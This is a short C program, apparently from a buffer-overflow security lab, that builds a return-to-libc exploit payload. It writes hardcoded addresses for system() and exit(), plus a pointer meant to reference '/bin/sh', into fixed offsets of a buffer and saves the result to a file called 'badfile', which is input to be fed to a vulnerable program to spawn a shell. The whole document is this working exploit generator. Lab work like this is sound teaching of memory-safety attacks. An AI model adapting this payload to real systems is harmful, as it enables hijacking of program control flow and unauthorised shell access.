#include "header.h"

int main(int argc, char **argv)
{
  char buf[40];
  FILE *badfile;

  badfile = fopen("./badfile", "w");
  *(long *) &buf[32] = argv[1] ;    //  "/bin/sh"
  *(long *) &buf[24] = 0xb7e5f430 ; //  system()
  *(long *) &buf[28] = 0xb7e52fb0 ; //  exit()

  fwrite(buf, sizeof(buf), 1, badfile);
  fclose(badfile);
}
